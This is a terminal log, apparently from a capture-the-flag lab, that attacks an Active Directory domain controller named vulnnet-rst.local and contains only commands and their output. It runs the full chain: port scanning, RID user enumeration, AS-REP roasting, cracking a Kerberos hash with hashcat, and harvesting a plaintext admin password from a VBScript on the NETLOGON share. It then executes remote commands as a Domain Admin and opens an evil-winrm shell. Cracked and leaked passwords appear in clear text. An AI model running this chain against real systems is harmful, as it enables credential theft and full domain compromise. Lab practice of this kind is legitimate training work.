

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap 10.10.216.131 -p- -sS -sV
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-26 08:21 EDT
Stats: 0:01:09 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 17.20% done; ETC: 08:28 (0:05:32 remaining)
Stats: 0:04:19 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 43.61% done; ETC: 08:31 (0:05:34 remaining)
Stats: 0:04:25 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 44.74% done; ETC: 08:31 (0:05:27 remaining)
Nmap scan report for vulnnet-rst.local (10.10.216.131)
Host is up (0.23s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-04-26 12:30:43Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49665/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
49705/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 614.89 seconds

```

```bash
┌──(kali㉿kali)-[~]
└─$ crackmapexec smb '10.10.216.131' -u 'a' -p '' -d 'vulnnet-rst.local' --rid-brute  | grep '(SidTypeUser)'
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  500: VULNNET-RST\Administrator (SidTypeUser)
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  501: VULNNET-RST\Guest (SidTypeUser)
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  502: VULNNET-RST\krbtgt (SidTypeUser)
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  1105: VULNNET-RST\a-whitehat (SidTypeUser)
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  1109: VULNNET-RST\t-skid (SidTypeUser)
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  1110: VULNNET-RST\j-goldenhand (SidTypeUser)
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  1111: VULNNET-RST\j-leet (SidTypeUser)
```

```bash
┌──(kali㉿kali)-[~/ctf/vulnnet]
└─$ impacket-GetNPUsers 'vulnnet-rst.local'/ -usersfile ~/ctf/vulnnet/users -dc-ip '10.10.216.131' -format 'hashcat'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User Administrator doesnt have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesnt have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User WIN-2BO8M1OE1M1$ doesnt have UF_DONT_REQUIRE_PREAUTH set
[-] User enterprise-core-vn doesnt have UF_DONT_REQUIRE_PREAUTH set
[-] User a-whitehat doesnt have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:2120558873f5f0cc6a5ceeed2183da92$860c562f0adf4566a20b04f6fa933a5dcf17a2834af2ed294c560830bba1987505771aeb8ee231324da980892a730fddce8f9ca114f8a34bac96a793c396aed2178bddc47b8f7ce7dcd90bbf966cbac199847e34d900a5fbfbcc04fdab35b62e38cd67bd180e84b9270993be9906e0362d0fc91f849b90789cc745dcc797bff4daf9cd5291d7ae79541b4fafe1424ee395fcda46b5f6aa2ddfabb5cdfcd7f2e959092ce89ad4f070764b7248b56968b6c294fe6c660b342af7f6330b4f9c17231141308d4fe1b179c20866c495875f1b963b2872940f15c4a987e25782f5c124665df4ecc1aa3bdb03b9528ef3b7c9aad81233fc83a5
[-] User j-goldenhand doesnt have UF_DONT_REQUIRE_PREAUTH set
[-] User j-leet doesnt have UF_DONT_REQUIRE_PREAUTH set

OR

┌──(kali㉿kali)-[~/ctf/vulnnet]
└─$ crackmapexec ldap -u 'users.txt' -p '' -d vulnnet-rst.local 10.10.216.131 -k --asreproast hash.txt
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  [*] Windows 10.0 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:False)
LDAP        10.10.216.131   445    WIN-2BO8M1OE1M1  $krb5asrep$23$t-skid@VULNNET-RST.LOCAL:53184a89a3f29c6670e4e8c71573e3d2$2378497395757af71372eb2ca6e3495617d17524889b42249a967e4145598a617b2c5de5f1af501c511faf8b3af039e145506da6184de398b65188c1f76e320847c2a7df8cd530f70d1a5720bc912032a54ca25be01d3c09b274c94146b62f8b0ec428ad23607fd1da00234129e696dd28e0f68c269bd62fd6a17ad61560fdee46e4e8ca4f89483fe84eb9b24849d4331362c69666192b617858df2854f720c9607726e7cb615672e3c63ca5f7ef5239a0f220ee0d5560bc05507bf4806566aefd7daa65d63c0012e59e8d67efbdfffd40412911fd6cc83c6e530233456826ae79d6f33950985f1170dd4121785d0e75832f08acb7d1
```

```bash
┌──(kali㉿kali)-[~/ctf/vulnnet]
└─$ hashcat -a 0 -m 18200 ~/ctf/vulnnet/hash.txt /usr/share/wordlists/rockyou.txt -O
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
==========================================================================================================================================
* Device #1: pthread--0x000, 2191/4446 MB (1024 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 31

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Optimized-Kernel
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 0 secs

$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:53184a89a3f29c6670e4e8c71573e3d2$2378497395757af71372eb2ca6e3495617d17524889b42249a967e4145598a617b2c5de5f1af501c511faf8b3af039e145506da6184de398b65188c1f76e320847c2a7df8cd530f70d1a5720bc912032a54ca25be01d3c09b274c94146b62f8b0ec428ad23607fd1da00234129e696dd28e0f68c269bd62fd6a17ad61560fdee46e4e8ca4f89483fe84eb9b24849d4331362c69666192b617858df2854f720c9607726e7cb615672e3c63ca5f7ef5239a0f220ee0d5560bc05507bf4806566aefd7daa65d63c0012e59e8d67efbdfffd40412911fd6cc83c6e530233456826ae79d6f33950985f1170dd4121785d0e75832f08acb7d1:tj072889*
   
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$t-skid@VULNNET-RST.LOCAL:53184a89a3f2...acb7d1
Time.Started.....: Wed Apr 26 08:49:08 2023 (3 secs)
Time.Estimated...: Wed Apr 26 08:49:11 2023 (0 secs)
Kernel.Feature...: Optimized Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1394.1 kH/s (0.67ms) @ Accel:512 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 3179313/14344385 (22.16%)
Rejected.........: 817/3179313 (0.03%)
Restore.Point....: 3178289/14344385 (22.16%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: tj1214 -> tixame0088
Hardware.Mon.#1..: Util:100%

Started: Wed Apr 26 08:48:55 2023
Stopped: Wed Apr 26 08:49:12 2023

```

```bash
┌──(kali㉿kali)-[~/ctf/vulnnet]
└─$ smbmap -H '10.10.216.131' -u 't-skid' -p 'tj072889*' -d 'vulnnet-rst.local' -R
[+] IP: 10.10.216.131:445	Name: vulnnet-rst.local                                 
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	.\IPC$\*
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	InitShutdown
	fr--r--r--                4 Sun Dec 31 19:03:58 1600	lsass
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	ntsvcs
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	scerpc
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-3f4-0
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	epmapper
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-2b4-0
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	LSM_API_service
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-314-0
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	eventlog
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-42c-0
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	atsvc
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	TermSrv_API_service
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	Ctx_WinStation_API_service
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-354-0
	fr--r--r--                5 Sun Dec 31 19:03:58 1600	wkssvc
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-314-1
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	RpcProxy\49670
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	50cd18b8edd7a20c
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	RpcProxy\593
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	SessEnvPublicRpc
	fr--r--r--                4 Sun Dec 31 19:03:58 1600	srvsvc
	fr--r--r--                4 Sun Dec 31 19:03:58 1600	W32TIME_ALT
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	spoolss
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-8d0-0
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	netdfs
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-304-0
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-968-0
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-954-0
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	Amazon\SSM\InstanceData\health
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	Amazon\SSM\InstanceData\termination
	NETLOGON                                          	READ ONLY	Logon server share 
	.\NETLOGON\*
	dr--r--r--                0 Tue Mar 16 19:15:49 2021	.
	dr--r--r--                0 Tue Mar 16 19:15:49 2021	..
	fr--r--r--             2821 Tue Mar 16 19:18:14 2021	ResetPassword.vbs
	SYSVOL                                            	READ ONLY	Logon server share 
	.\SYSVOL\*
	dr--r--r--                0 Thu Mar 11 14:20:41 2021	.
	dr--r--r--                0 Thu Mar 11 14:20:41 2021	..
	dr--r--r--                0 Thu Mar 11 14:20:41 2021	vulnnet-rst.local
	.\SYSVOL\vulnnet-rst.local\*
	dr--r--r--                0 Thu Mar 11 14:23:40 2021	.
	dr--r--r--                0 Thu Mar 11 14:23:40 2021	..
	dr--r--r--                0 Wed Apr 26 08:20:13 2023	DfsrPrivate
	dr--r--r--                0 Thu Mar 11 14:20:41 2021	Policies
	dr--r--r--                0 Tue Mar 16 19:15:49 2021	scripts
	.\SYSVOL\vulnnet-rst.local\Policies\*
	dr--r--r--                0 Thu Mar 11 14:20:41 2021	.
	dr--r--r--                0 Thu Mar 11 14:20:41 2021	..
	dr--r--r--                0 Thu Mar 11 14:20:41 2021	{31B2F340-016D-11D2-945F-00C04FB984F9}
	dr--r--r--                0 Thu Mar 11 14:20:41 2021	{6AC1786C-016F-11D2-945F-00C04fB984F9}
	.\SYSVOL\vulnnet-rst.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\*
	dr--r--r--                0 Thu Mar 11 14:20:41 2021	.
	dr--r--r--                0 Thu Mar 11 14:20:41 2021	..
	fr--r--r--               22 Fri Mar 12 21:53:26 2021	GPT.INI
	dr--r--r--                0 Fri Mar 12 21:51:28 2021	MACHINE
	dr--r--r--                0 Thu Mar 11 14:20:41 2021	USER
	.\SYSVOL\vulnnet-rst.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\*
	dr--r--r--                0 Fri Mar 12 21:51:28 2021	.
	dr--r--r--                0 Fri Mar 12 21:51:28 2021	..
	dr--r--r--                0 Thu Mar 11 14:20:41 2021	Microsoft
	fr--r--r--             2798 Thu Mar 11 14:25:58 2021	Registry.pol
	dr--r--r--                0 Fri Mar 12 21:51:28 2021	Scripts
	.\SYSVOL\vulnnet-rst.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\*
	dr--r--r--                0 Thu Mar 11 14:20:41 2021	.
	dr--r--r--                0 Thu Mar 11 14:20:41 2021	..
	dr--r--r--                0 Thu Mar 11 14:20:41 2021	Windows NT
	.\SYSVOL\vulnnet-rst.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Scripts\*
	dr--r--r--                0 Fri Mar 12 21:51:28 2021	.
	dr--r--r--                0 Fri Mar 12 21:51:28 2021	..
	dr--r--r--                0 Fri Mar 12 21:51:28 2021	Shutdown
	dr--r--r--                0 Fri Mar 12 21:51:28 2021	Startup
	.\SYSVOL\vulnnet-rst.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\USER\*
	dr--r--r--                0 Fri Mar 12 21:52:20 2021	.
	dr--r--r--                0 Fri Mar 12 21:52:20 2021	..
	dr--r--r--                0 Fri Mar 12 21:52:20 2021	Documents & Settings
	dr--r--r--                0 Fri Mar 12 21:52:20 2021	Scripts
	.\SYSVOL\vulnnet-rst.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\USER\Scripts\*
	dr--r--r--                0 Fri Mar 12 21:52:20 2021	.
	dr--r--r--                0 Fri Mar 12 21:52:20 2021	..
	dr--r--r--                0 Fri Mar 12 21:52:20 2021	Logoff
	dr--r--r--                0 Fri Mar 12 21:52:20 2021	Logon
	.\SYSVOL\vulnnet-rst.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\*
	dr--r--r--                0 Thu Mar 11 14:20:41 2021	.
	dr--r--r--                0 Thu Mar 11 14:20:41 2021	..
	fr--r--r--               22 Sat Mar 13 18:39:58 2021	GPT.INI
	dr--r--r--                0 Thu Mar 11 14:20:41 2021	MACHINE
	dr--r--r--                0 Thu Mar 11 14:20:41 2021	USER
	.\SYSVOL\vulnnet-rst.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\*
	dr--r--r--                0 Sat Mar 13 18:39:30 2021	.
	dr--r--r--                0 Sat Mar 13 18:39:30 2021	..
	dr--r--r--                0 Thu Mar 11 14:20:41 2021	Microsoft
	dr--r--r--                0 Sat Mar 13 18:39:30 2021	Scripts
	.\SYSVOL\vulnnet-rst.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\*
	dr--r--r--                0 Thu Mar 11 14:20:41 2021	.
	dr--r--r--                0 Thu Mar 11 14:20:41 2021	..
	dr--r--r--                0 Thu Mar 11 14:20:41 2021	Windows NT
	.\SYSVOL\vulnnet-rst.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Scripts\*
	dr--r--r--                0 Sat Mar 13 18:39:30 2021	.
	dr--r--r--                0 Sat Mar 13 18:39:30 2021	..
	dr--r--r--                0 Sat Mar 13 18:39:30 2021	Shutdown
	dr--r--r--                0 Sat Mar 13 18:39:30 2021	Startup
	.\SYSVOL\vulnnet-rst.local\scripts\*
	dr--r--r--                0 Tue Mar 16 19:15:49 2021	.
	dr--r--r--                0 Tue Mar 16 19:15:49 2021	..
	fr--r--r--             2821 Tue Mar 16 19:18:14 2021	ResetPassword.vbs
	VulnNet-Business-Anonymous                        	READ ONLY	VulnNet Business Sharing
	.\VulnNet-Business-Anonymous\*
	dr--r--r--                0 Fri Mar 12 22:21:04 2021	.
	dr--r--r--                0 Fri Mar 12 22:21:04 2021	..
	fr--r--r--              758 Fri Mar 12 22:21:04 2021	Business-Manager.txt
	fr--r--r--              654 Fri Mar 12 22:21:04 2021	Business-Sections.txt
	fr--r--r--              471 Fri Mar 12 22:21:04 2021	Business-Tracking.txt
	VulnNet-Enterprise-Anonymous                      	READ ONLY	VulnNet Enterprise Sharing
	.\VulnNet-Enterprise-Anonymous\*
	dr--r--r--                0 Fri Mar 12 22:19:59 2021	.
	dr--r--r--                0 Fri Mar 12 22:19:59 2021	..
	fr--r--r--              467 Fri Mar 12 22:19:59 2021	Enterprise-Operations.txt
	fr--r--r--              503 Fri Mar 12 22:19:59 2021	Enterprise-Safety.txt
	fr--r--r--              496 Fri Mar 12 22:19:59 2021	Enterprise-Sync.txt

```

```bash                                                    
┌──(kali㉿kali)-[~/ctf/vulnnet]
└─$ cat 10.10.216.131-NETLOGON_ResetPassword.vbs
Option Explicit

Dim objRootDSE, strDNSDomain, objTrans, strNetBIOSDomain
Dim strUserDN, objUser, strPassword, strUserNTName

' Constants for the NameTranslate object.
Const ADS_NAME_INITTYPE_GC = 3
Const ADS_NAME_TYPE_NT4 = 3
Const ADS_NAME_TYPE_1779 = 1

If (Wscript.Arguments.Count <> 0) Then
    Wscript.Echo "Syntax Error. Correct syntax is:"
    Wscript.Echo "cscript ResetPassword.vbs"
    Wscript.Quit
End If

strUserNTName = "a-whitehat"
strPassword = "bNdKVkjv3RR9ht"

' Determine DNS domain name from RootDSE object.
Set objRootDSE = GetObject("LDAP://RootDSE")
strDNSDomain = objRootDSE.Get("defaultNamingContext")

' Use the NameTranslate object to find the NetBIOS domain name from the
' DNS domain name.
Set objTrans = CreateObject("NameTranslate")
objTrans.Init ADS_NAME_INITTYPE_GC, ""
objTrans.Set ADS_NAME_TYPE_1779, strDNSDomain
strNetBIOSDomain = objTrans.Get(ADS_NAME_TYPE_NT4)
' Remove trailing backslash.
strNetBIOSDomain = Left(strNetBIOSDomain, Len(strNetBIOSDomain) - 1)

' Use the NameTranslate object to convert the NT user name to the
' Distinguished Name required for the LDAP provider.
On Error Resume Next
objTrans.Set ADS_NAME_TYPE_NT4, strNetBIOSDomain & "\" & strUserNTName
If (Err.Number <> 0) Then
    On Error GoTo 0
    Wscript.Echo "User " & strUserNTName _
        & " not found in Active Directory"
    Wscript.Echo "Program aborted"
    Wscript.Quit
End If
strUserDN = objTrans.Get(ADS_NAME_TYPE_1779)
' Escape any forward slash characters, "/", with the backslash
' escape character. All other characters that should be escaped are.
strUserDN = Replace(strUserDN, "/", "\/")

' Bind to the user object in Active Directory with the LDAP provider.
On Error Resume Next
Set objUser = GetObject("LDAP://" & strUserDN)
If (Err.Number <> 0) Then
    On Error GoTo 0
    Wscript.Echo "User " & strUserNTName _
        & " not found in Active Directory"
    Wscript.Echo "Program aborted"
    Wscript.Quit
End If
objUser.SetPassword strPassword
If (Err.Number <> 0) Then
    On Error GoTo 0
    Wscript.Echo "Password NOT reset for " &vbCrLf & strUserNTName
    Wscript.Echo "Password " & strPassword & " may not be allowed, or"
    Wscript.Echo "this client may not support a SSL connection."
    Wscript.Echo "Program aborted"
    Wscript.Quit
Else
    objUser.AccountDisabled = False
    objUser.Put "pwdLastSet", 0
    Err.Clear
    objUser.SetInfo
    If (Err.Number <> 0) Then
        On Error GoTo 0
        Wscript.Echo "Password reset for " & strUserNTName
        Wscript.Echo "But, unable to enable account or expire password"
        Wscript.Quit
    End If
End If
On Error GoTo 0

Wscript.Echo "Password reset, account enabled,"
Wscript.Echo "and password expired for user " & strUserNTName   
```

```bash
┌──(kali㉿kali)-[~/ctf/vulnnet]
└─$ crackmapexec smb '10.10.216.131' -u 'a-whitehat' -p 'bNdKVkjv3RR9ht' -d 'vulnnet-rst.local'  -x "whoami /all"
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  [*] Windows 10.0 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:False)
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\a-whitehat:bNdKVkjv3RR9ht (Pwn3d!)
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  [+] Executed command 
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  USER INFORMATION
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  ----------------
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  User Name              SID
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  ====================== =============================================
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  vulnnet-rst\a-whitehat S-1-5-21-1589833671-435344116-4136949213-1105
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  GROUP INFORMATION
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  -----------------
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  Group Name                                         Type             SID                                          Attributes
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  ================================================== ================ ============================================ ===============================================================
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  Everyone                                           Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  BUILTIN\Users                                      Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  BUILTIN\Pre-Windows 2000 Compatible Access         Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  BUILTIN\Administrators                             Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Group owner
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  NT AUTHORITY\NETWORK                               Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  NT AUTHORITY\Authenticated Users                   Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  NT AUTHORITY\This Organization                     Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  VULNNET-RST\Domain Admins                          Group            S-1-5-21-1589833671-435344116-4136949213-512 Mandatory group, Enabled by default, Enabled group
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  VULNNET-RST\Denied RODC Password Replication Group Alias            S-1-5-21-1589833671-435344116-4136949213-572 Mandatory group, Enabled by default, Enabled group, Local Group
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  NT AUTHORITY\NTLM Authentication                   Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  Mandatory Label\High Mandatory Level               Label            S-1-16-12288
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  PRIVILEGES INFORMATION
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  ----------------------
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  Privilege Name                            Description                                                        State
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  ========================================= ================================================================== =======
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  SeSystemtimePrivilege                     Change the system time                                             Enabled
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  SeBackupPrivilege                         Back up files and directories                                      Enabled
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  SeRestorePrivilege                        Restore files and directories                                      Enabled
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  SeShutdownPrivilege                       Shut down the system                                               Enabled
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  SeDebugPrivilege                          Debug programs                                                     Enabled
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  SeUndockPrivilege                         Remove computer from docking station                               Enabled
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  SeTimeZonePrivilege                       Change the time zone                                               Enabled
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  USER CLAIMS INFORMATION
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  -----------------------
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  User claims unknown.
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  
SMB         10.10.216.131   445    WIN-2BO8M1OE1M1  Kerberos support for Dynamic Access Control on this device has been disabled.

```


```bash
┌──(kali㉿kali)-[~]
└─$ evil-winrm -i '10.10.64.234' -u 'a-whitehat' -p 'bNdKVkjv3RR9ht'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

